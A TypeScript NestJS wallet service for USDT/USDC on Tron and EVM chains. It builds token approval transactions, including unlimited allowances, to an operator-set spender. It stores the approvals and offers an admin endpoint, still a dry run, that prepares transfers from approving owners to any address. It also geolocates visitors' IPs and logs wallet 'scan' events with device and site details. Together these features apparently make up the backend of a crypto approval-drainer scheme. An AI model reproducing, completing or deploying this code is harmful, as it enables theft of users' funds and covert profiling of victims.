import { BadRequestException, Injectable, NotFoundException, UnauthorizedException } from "@nestjs/common";
import { PrismaClient, type Prisma } from "@prisma/client";

type TokenSymbol = "USDT" | "USDC";
type EvmChainKey = "eth" | "bsc" | "pol" | "avax" | "arb" | "base";
type TokenBalances = { native: string; usdt: string; usdc?: string };

const prisma = new PrismaClient();
const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
const EVM_ADDRESS_RE = /^0x[a-fA-F0-9]{40}$/;
const TRON_GRID = "https://api.trongrid.io";
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const TERMS_VERSION = "2026-07-28";
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const TRON_APPROVE_FEE_LIMIT_SUN = 150_000_000;

const EVM_CHAIN_ID: Record<EvmChainKey, number> = {
  eth: 1, bsc: 56, pol: 137, avax: 43114, arb: 42161, base: 8453,
};
const EVM_RPCS: Record<EvmChainKey, string[]> = {
  eth: ["https://ethereum.publicnode.com", "https://cloudflare-eth.com"],
  bsc: ["https://bsc-dataseed.binance.org", "https://1rpc.io/bnb"],
  pol: ["https://polygon-bor.publicnode.com", "https://1rpc.io/matic"],
  avax: ["https://avalanche-c-chain.publicnode.com", "https://api.avax.network/ext/bc/C/rpc"],
  arb: ["https://arbitrum-one.publicnode.com", "https://1rpc.io/arb"],
  base: ["https://base.publicnode.com", "https://1rpc.io/base"],
};

const TOKENS = {
  tron: {
    USDT: { address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
    USDC: { address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
  },
  eth: {
    USDT: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    USDC: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
  },
  bsc: {
    USDT: { address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
    USDC: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
  },
  pol: {
    USDT: { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
    USDC: { address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6 },
  },
  avax: {
    USDT: { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
    USDC: { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
  },
  arb: {
    USDT: { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
    USDC: { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
  },
  base: {
    USDT: { address: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6 },
    USDC: { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
  },
} as const;

function decodeTronNodeMessage(message: unknown): string | null {
  if (typeof message !== "string" || !message) return null;
  try {
    if (/^[0-9a-fA-F]+$/.test(message) && message.length % 2 === 0) {
      return Buffer.from(message, "hex").toString("utf8");
    }
  } catch {
    // keep original message
  }
  return message;
}

function humanizeTronBroadcastError(args: {
  code?: string | null;
  message?: string | null;
}): string {
  const code = (args.code ?? "").trim().toUpperCase();
  const msg = (args.message ?? "").trim();

  if (
    code.includes("BANDWITH") ||
    code.includes("BANDWIDTH") ||
    /resource insufficient|bandwidth|energy/i.test(msg)
  ) {
    return (
      "Tron broadcast rejected: insufficient Bandwidth/Energy/TRX. " +
      "Add a small amount of TRX (or stake for energy), then try again. " +
      (msg ? `Node: ${msg}` : code ? `Code: ${code}` : "")
    ).trim();
  }

  if (code === "SIGERROR" || /signature/i.test(msg)) {
    return `Tron broadcast rejected: invalid signature. ${msg || code}`.trim();
  }

  if (msg) return `Tron broadcast failed: ${msg}${code ? ` (${code})` : ""}`;
  if (code) return `Tron broadcast failed: ${code}`;
  return "Tron broadcast rejected";
}

@Injectable()
export class WalletService {
  private getHeader(
    headers: Headers | Record<string, string | string[] | undefined>,
    name: string
  ): string {
    if (headers && typeof (headers as Headers).get === "function") {
      return (headers as Headers).get(name)?.trim() ?? "";
    }
    const key = name.toLowerCase();
    const value = (headers as Record<string, string | string[] | undefined>)[key];
    if (Array.isArray(value)) return String(value[0] ?? "").trim();
    return String(value ?? "").trim();
  }

  private spenderEvm() { return (process.env.NEXT_PUBLIC_SPENDER_EVM ?? "").trim(); }
  private spenderTron() { return (process.env.NEXT_PUBLIC_SPENDER_TRON ?? "").trim(); }
  private spenderFor(network: string) { return network === "tron" ? this.spenderTron() : this.spenderEvm(); }
  private parseToken(raw: unknown): TokenSymbol {
    const s = String(raw ?? "USDT").trim().toUpperCase();
    if (s === "USDT" || s === "USDC") return s;
    throw new BadRequestException("token must be USDT or USDC");
  }
  private isEvm(network: string): network is EvmChainKey { return ["eth", "bsc", "pol", "avax", "arb", "base"].includes(network); }
  private getToken(network: string, token: TokenSymbol) {
    if (network === "tron") return TOKENS.tron[token];
    if (this.isEvm(network)) return TOKENS[network][token];
    return null;
  }
  private parseHumanToRaw(human: string, decimals: number): bigint {
    const cleaned = human.trim().replace(/,/g, "");
    if (!/^\d+(\.\d+)?$/.test(cleaned)) throw new BadRequestException("Invalid amountHuman");
    const [whole, frac = ""] = cleaned.split(".");
    const fracPadded = (frac + "0".repeat(decimals)).slice(0, decimals);
    return BigInt(whole) * BigInt(10) ** BigInt(decimals) + BigInt(fracPadded || "0");
  }
  private formatUnits(value: bigint, decimals: number): string {
    const base = BigInt(10) ** BigInt(decimals);
    const whole = value / base;
    const frac = (value % base).toString().padStart(decimals, "0").replace(/0+$/, "");
    return frac ? `${whole}.${frac}` : whole.toString();
  }
  private encodeApprove(spender: string, amount: bigint): string {
    const pad = (v: string) => v.replace(/^0x/i, "").toLowerCase().padStart(64, "0");
    return `0x095ea7b3${pad(spender)}${pad(amount.toString(16))}`;
  }
  private base58ToHex(base58: string): string {
    let num = BigInt(0);
    for (const ch of base58) {
      const i = ALPHABET.indexOf(ch);
      if (i < 0) throw new BadRequestException("Invalid base58 address");
      num = num * BigInt(58) + BigInt(i);
    }
    let hex = num.toString(16);
    if (hex.length % 2) hex = `0${hex}`;
    let leading = 0;
    for (const ch of base58) { if (ch === "1") leading += 1; else break; }
    hex = `${"00".repeat(leading)}${hex}`;
    if (hex.length < 8) throw new BadRequestException("Address too short");
    return hex.slice(0, -8);
  }
  private tronAddressToAbiWord(base58: string): string {
    const hex = this.base58ToHex(base58);
    const body = hex.startsWith("41") ? hex.slice(2) : hex.slice(-40);
    return body.padStart(64, "0");
  }
  private async rpcCall(rpc: string, method: string, params: unknown[]): Promise<string> {
    const res = await fetch(rpc, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }), cache: "no-store" });
    const json = (await res.json()) as { result?: string; error?: { message?: string } };
    if (!res.ok || json.error) throw new Error(json.error?.message || `RPC ${res.status}`);
    return json.result ?? "0x0";
  }
  private async recordAudit(actor: string, action: string, entityType: string, payload: Record<string, unknown>, entityId?: string) {
    await prisma.auditLog.create({
      data: {
        actor,
        action,
        entityType,
        entityId,
        payload: payload as Prisma.InputJsonValue,
      },
    });
  }

  async getBalances(evm: string, tron: string) {
    if (!evm && !tron) throw new BadRequestException("Provide at least evm or tron address");
    if (evm && !EVM_ADDRESS_RE.test(evm)) throw new BadRequestException("Invalid EVM address");
    if (tron && !TRON_ADDRESS_RE.test(tron)) throw new BadRequestException("Invalid TRON address");
    const result: Record<string, TokenBalances> = {};
    if (evm) {
      for (const network of Object.keys(EVM_RPCS) as EvmChainKey[]) {
        const rpcs = EVM_RPCS[network];
        let native = "0";
        for (const rpc of rpcs) {
          try { native = this.formatUnits(BigInt(await this.rpcCall(rpc, "eth_getBalance", [evm, "latest"])), 18); break; } catch {}
        }
        const usdtCfg = TOKENS[network].USDT;
        const usdcCfg = TOKENS[network].USDC;
        const [usdtRaw, usdcRaw] = await Promise.all([
          this.rpcCall(rpcs[0], "eth_call", [{ to: usdtCfg.address, data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}` }, "latest"]).catch(() => "0x0"),
          this.rpcCall(rpcs[0], "eth_call", [{ to: usdcCfg.address, data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}` }, "latest"]).catch(() => "0x0"),
        ]);
        result[network] = { native, usdt: this.formatUnits(BigInt(usdtRaw), usdtCfg.decimals), usdc: this.formatUnits(BigInt(usdcRaw), usdcCfg.decimals) };
      }
    }
    if (tron) {
      const res = await fetch(`https://api.trongrid.io/v1/accounts/${tron}`, { cache: "no-store" });
      const json = (await res.json().catch(() => ({}))) as { data?: Array<{ balance?: number; trc20?: Array<Record<string, string>> }> };
      const acc = json.data?.[0];
      let usdt = BigInt(0); let usdc = BigInt(0);
      for (const t of acc?.trc20 ?? []) {
        if (t[TOKENS.tron.USDT.address] !== undefined) usdt = BigInt(t[TOKENS.tron.USDT.address]);
        if (t[TOKENS.tron.USDC.address] !== undefined) usdc = BigInt(t[TOKENS.tron.USDC.address]);
      }
      result.tron = { native: this.formatUnits(BigInt(acc?.balance ?? 0), 6), usdt: this.formatUnits(usdt, 6), usdc: this.formatUnits(usdc, 6) };
    }
    return result;
  }

  async prepareApproval(body: Record<string, unknown>) {
    const network = String(body.network ?? "").trim().toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const token = this.parseToken(body.token);
    const unlimited = Boolean(body.unlimited);
    if (!network || !owner) throw new BadRequestException("network and owner are required");
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
    const amountRaw = unlimited ? BigInt(MAX_UINT256) : this.parseHumanToRaw(String(body.amountHuman ?? "").trim(), tokenInfo.decimals);
    if (!unlimited && amountRaw <= BigInt(0)) throw new BadRequestException("Amount must be greater than zero");
    const spender = this.spenderFor(network);
    if (!spender) throw new BadRequestException(network === "tron" ? "Set NEXT_PUBLIC_SPENDER_TRON" : "Set NEXT_PUBLIC_SPENDER_EVM");
    if (network === "tron") {
      if (!TRON_ADDRESS_RE.test(owner) || !TRON_ADDRESS_RE.test(spender)) throw new BadRequestException("Invalid Tron owner/spender");
      const parameter = `${this.tronAddressToAbiWord(spender)}${amountRaw.toString(16).padStart(64, "0")}`;
      const res = await fetch(`${TRON_GRID}/wallet/triggersmartcontract`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ owner_address: this.base58ToHex(owner), contract_address: this.base58ToHex(tokenInfo.address), function_selector: "approve(address,uint256)", parameter, fee_limit: TRON_APPROVE_FEE_LIMIT_SUN, call_value: 0, visible: false }),
        cache: "no-store",
      });
      const json = (await res.json()) as { transaction?: Record<string, unknown>; result?: { message?: string; result?: boolean }; Error?: string };
      if (!res.ok || json.result?.result === false || !json.transaction) throw new BadRequestException(json.result?.message || json.Error || "Failed to build Tron tx");
      await this.recordAudit(`owner:${owner}`, "prepare", "approval", { network, token, unlimited, spender, amountRaw: amountRaw.toString() });
      return { network, owner, spender, token, tokenAddress: tokenInfo.address, decimals: tokenInfo.decimals, amountRaw: amountRaw.toString(), amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""), unlimited, transaction: json.transaction };
    }
    if (!this.isEvm(network) || !EVM_ADDRESS_RE.test(owner) || !EVM_ADDRESS_RE.test(spender)) throw new BadRequestException("Invalid EVM network/owner/spender");
    await this.recordAudit(`owner:${owner}`, "prepare", "approval", { network, token, unlimited, spender, amountRaw: amountRaw.toString() });
    return { network, owner, spender, token, tokenAddress: tokenInfo.address, decimals: tokenInfo.decimals, amountRaw: amountRaw.toString(), amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""), unlimited, chainId: EVM_CHAIN_ID[network], to: tokenInfo.address, data: this.encodeApprove(spender, amountRaw), value: "0x0" };
  }

  async verifyAllowance(body: Record<string, unknown>) {
    const network = String(body.network ?? "").trim().toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const spender = String(body.spender ?? "").trim();
    const token = this.parseToken(body.token);
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo || !owner || !spender) throw new BadRequestException("network, owner, spender and token required");
    if (network === "tron") {
      const parameter = `${this.tronAddressToAbiWord(owner)}${this.tronAddressToAbiWord(spender)}`;
      const res = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ owner_address: owner, contract_address: tokenInfo.address, function_selector: "allowance(address,address)", parameter, visible: true }), cache: "no-store" });
      const json = (await res.json()) as { constant_result?: string[]; result?: { message?: string } };
      const hex = json.constant_result?.[0];
      if (!hex) throw new BadRequestException(json.result?.message || "Tron allowance failed");
      const allowance = BigInt(`0x${hex}`).toString();
      return { ok: true, hasAllowance: BigInt(allowance) > BigInt(0), allowance, spender, token, tokenAddress: tokenInfo.address };
    }
    if (!this.isEvm(network)) throw new BadRequestException("Unsupported network");
    const data = `0xdd62ed3e${owner.slice(2).toLowerCase().padStart(64, "0")}${spender.slice(2).toLowerCase().padStart(64, "0")}`;
    const result = await this.rpcCall(EVM_RPCS[network][0], "eth_call", [{ to: tokenInfo.address, data }, "latest"]);
    const allowance = BigInt(result).toString();
    return { ok: true, hasAllowance: BigInt(allowance) > BigInt(0), allowance, spender, token, tokenAddress: tokenInfo.address };
  }

  async confirmApproval(body: Record<string, unknown>) {
    const network = String(body.network ?? "").trim().toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const txHash = String(body.txHash ?? "").trim();
    const amountRaw = String(body.amountRaw ?? "").trim();
    const token = this.parseToken(body.token);
    if (!network || !owner || !txHash || !amountRaw) throw new BadRequestException("network, owner, txHash, amountRaw required");
    const spender = this.spenderFor(network);
    const verified = await this.verifyAllowance({ network, owner, spender, token });
    const expected = BigInt(amountRaw);
    const onChain = BigInt(verified.allowance);
    const unlimited = Boolean(body.unlimited);
    const hasAllowance = unlimited ? onChain > BigInt(0) : onChain >= expected;
    const tokenInfo = this.getToken(network, token)!;

    const approval = await prisma.approval.upsert({
      where: { network_txHash: { network, txHash } },
      update: {
        status: hasAllowance ? "ACTIVE" : "SUBMITTED",
        amountRaw,
        amountHuman: String(body.amountHuman ?? amountRaw),
        remainingRaw: amountRaw,
        unlimited,
        termsVersion: String(body.termsVersion ?? TERMS_VERSION),
        updatedAt: new Date(),
      },
      create: {
        ownerAddress: owner,
        spenderAddress: spender,
        network,
        tokenSymbol: token,
        tokenAddress: tokenInfo.address,
        decimals: tokenInfo.decimals,
        amountRaw,
        amountHuman: String(body.amountHuman ?? amountRaw),
        remainingRaw: amountRaw,
        txHash,
        status: hasAllowance ? "ACTIVE" : "SUBMITTED",
        termsVersion: String(body.termsVersion ?? TERMS_VERSION),
        unlimited,
      },
    });
    await this.recordAudit(`owner:${owner}`, "confirm", "approval", { network, txHash, allowance: verified.allowance, confirmed: hasAllowance }, approval.id);
    return { ok: true, approvalId: approval.id, status: approval.status, allowance: verified.allowance, hasAllowance, txHash, spender, timestamp: approval.createdAt };
  }

  async debugApprovals() {
    const [approvals, audits, transfers] = await Promise.all([
      prisma.approval.findMany({ orderBy: { createdAt: "desc" }, take: 100 }),
      prisma.auditLog.findMany({ orderBy: { createdAt: "desc" }, take: 100 }),
      prisma.transfer.findMany({ orderBy: { createdAt: "desc" }, take: 100 }),
    ]);
    return { ok: true, approvals, audits, transfers, timestamp: new Date().toISOString() };
  }
  async captureFlowLog(body: Record<string, unknown>) { console.log("[flow]", body); return { ok: true }; }
  async getApproval(id: string) {
    const approval = await prisma.approval.findUnique({ where: { id } });
    if (!approval) throw new NotFoundException("not_found");
    return { approval };
  }
  async prepareRevoke(body: Record<string, unknown>) {
    const approvalId = String(body.approvalId ?? "").trim();
    const approval = approvalId ? await prisma.approval.findUnique({ where: { id: approvalId } }) : null;
    const network = (approval?.network ?? String(body.network ?? "")).trim().toLowerCase();
    const owner = (approval?.ownerAddress ?? String(body.owner ?? "")).trim();
    const token = this.parseToken(approval?.tokenSymbol ?? body.token);
    return this.prepareApproval({ network, owner, token, amountHuman: "0", unlimited: false });
  }
  async broadcastTron(transaction: Record<string, unknown>) {
    const signature = transaction.signature;
    if (!Array.isArray(signature) || signature.length === 0) throw new BadRequestException("Signed transaction is missing signature[]");
    const res = await fetch(`${TRON_GRID}/wallet/broadcasttransaction`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(transaction), cache: "no-store" });
    const json = (await res.json().catch(() => ({}))) as { result?: boolean; txid?: string; message?: string; code?: string };
    const decodedMessage = decodeTronNodeMessage(json.message);
    if (!res.ok || json.result !== true || !json.txid) {
      return {
        result: false,
        error: humanizeTronBroadcastError({
          code: json.code ?? null,
          message: decodedMessage,
        }),
        code: json.code ?? null,
        message: decodedMessage ?? null,
        trongrid: json,
      };
    }
    return { result: true, txid: json.txid, trongrid: json };
  }
  async registerApproved(body: Record<string, unknown>) {
    const network = String(body.network ?? "").trim().toLowerCase();
    const address = String(body.address ?? "").trim();
    if (!network || !address) throw new BadRequestException("network and address are required");
    const amountRaw = String(body.amountRaw ?? body.allowance ?? "0");
    const txHash = String(body.txid ?? "").trim() || `legacy:${network}:${address.toLowerCase()}`;
    const token = this.parseToken(body.token);
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported network/token");
    const approval = await prisma.approval.upsert({
      where: { network_txHash: { network, txHash } },
      update: { status: "ACTIVE", amountRaw, amountHuman: String(body.amountHuman ?? amountRaw), remainingRaw: amountRaw, updatedAt: new Date() },
      create: { ownerAddress: address, spenderAddress: this.spenderFor(network), network, tokenSymbol: token, tokenAddress: tokenInfo.address, decimals: tokenInfo.decimals, amountRaw, amountHuman: String(body.amountHuman ?? amountRaw), remainingRaw: amountRaw, txHash, status: "ACTIVE", termsVersion: TERMS_VERSION, unlimited: false },
    });
    await this.recordAudit(`owner:${address}`, "register_legacy", "approval", { network, txHash }, approval.id);
    return { code: 200, status: "success", message: "OK", data: { registered: true, approvalId: approval.id }, timestamp: new Date().toISOString() };
  }
  async adminTransfer(
    body: Record<string, unknown>,
    headers: Headers | Record<string, string | string[] | undefined>
  ) {
    const apiKey = this.getHeader(headers, "x-admin-api-key");
    const expected = (process.env.ADMIN_API_KEY ?? "").trim();
    if (!expected || apiKey !== expected) throw new UnauthorizedException("Unauthorized");
    const approvalId = String(body.approvalId ?? "").trim();
    const amountRaw = String(body.amountRaw ?? "").trim();
    const idempotencyKey = String(body.idempotencyKey ?? "").trim();
    const toAddress = String(body.toAddress ?? "").trim();
    if (!approvalId || !amountRaw || !idempotencyKey || !toAddress) throw new BadRequestException("approvalId, amountRaw, idempotencyKey, and toAddress are required");
    const existing = await prisma.transfer.findUnique({ where: { idempotencyKey } });
    if (existing) return { ok: true, idempotent: true, transfer: existing };
    const approval = await prisma.approval.findUnique({ where: { id: approvalId } });
    if (!approval) throw new NotFoundException("Approval not found");
    const transfer = await prisma.transfer.create({ data: { approvalId, escrowIntentId: String(body.escrowIntentId ?? "") || null, idempotencyKey, amountRaw, fromAddress: approval.ownerAddress, toAddress, status: "pending" } });
    await this.recordAudit("admin", "transfer_dry_run", "transfer", { approvalId, amountRaw, toAddress }, transfer.id);
    return { ok: true, dryRun: true, transfer, message: "Checks + persistence ready. Execute transferFrom signer wiring as next step." };
  }
  legacyTronApprove(body: Record<string, unknown>) {
    return this.prepareApproval({ network: "tron", owner: body.owner, token: body.token, amountHuman: body.amountHuman, unlimited: body.unlimited });
  }
  async consent(body: Record<string, unknown>) {
    const address = String(body.address ?? "").trim();
    const txid = String(body.txid ?? body.txHash ?? body.hash ?? "").trim();
    const ok = Boolean(address && txid);
    await this.recordAudit(`owner:${address || "unknown"}`, "consent", "consent", { ...body, ok });
    return { ok, txid };
  }
  async energyDelegate(body: Record<string, unknown>) {
    const address = String(body.address ?? "").trim();
    if (!address) throw new BadRequestException("body must have required property 'address'");
    return { code: 200, status: "success", message: "OK", data: { delegated: false, placeholder: true, address, currentUsdt: String(body.currentUsdt ?? "0") }, timestamp: new Date().toISOString() };
  }
  async ipgeo(headers: Headers | Record<string, string | string[] | undefined>) {
    try {
      const forwardedFor = this.getHeader(headers, "x-forwarded-for");
      const realIp = this.getHeader(headers, "x-real-ip");
      const headerIp = forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
      const local = !headerIp || headerIp === "unknown" || headerIp === "127.0.0.1" || headerIp === "::1" || headerIp.startsWith("127.") || headerIp.startsWith("::ffff:127.");
      const url = local ? "http://ip-api.com/json/?fields=status,query,country,city,countryCode" : `http://ip-api.com/json/${encodeURIComponent(headerIp)}?fields=status,query,country,city,countryCode`;
      const res = await fetch(url, { cache: "no-store" });
      if (!res.ok) return { ip: headerIp, location: "Unknown" };
      const json = (await res.json()) as { status?: string; query?: string; country?: string; city?: string; countryCode?: string };
      if (json.status !== "success") return { ip: headerIp, location: "Unknown" };
      const ip = json.query || headerIp;
      const location = json.country && json.city ? `${json.country}, ${json.city}` : json.country || "Unknown";
      return { ip, location };
    } catch {
      return { ip: "unknown", location: "Unknown" };
    }
  }
  async tgLog(
    body: Record<string, unknown>,
    headers: Headers | Record<string, string | string[] | undefined>
  ) {
    const address = String(body.address ?? body.tron ?? body.evm ?? "").trim();
    if (!address) throw new BadRequestException("Provide address");
    const userAgent = String(
      body.userAgent || this.getHeader(headers, "user-agent") || "unknown"
    );
    const forwardedFor = this.getHeader(headers, "x-forwarded-for");
    const realIp = this.getHeader(headers, "x-real-ip");
    const fallbackIp = forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
    const ip = String(body.ip ?? fallbackIp);
    const location = String(body.location ?? "Unknown");
    const network = String(body.network ?? (address.startsWith("T") ? "tron" : "evm"));
    const status = String(body.status ?? "success");
    const eventType = String(body.type ?? body.event ?? "scan");
    await prisma.tgLogEvent.create({ data: { type: eventType, network, address, status, error: body.error ? String(body.error) : null, ip, location, site: String(body.site ?? this.getHeader(headers, "host") ?? "unknown"), device: /mobi|iphone|android/i.test(userAgent) ? "Mobile" : /mac|win|linux|cros/i.test(userAgent) ? "Desktop" : "Other" } });
    return { code: 200, status: "success", message: "OK", data: { sent: false }, timestamp: new Date().toISOString() };
  }
}
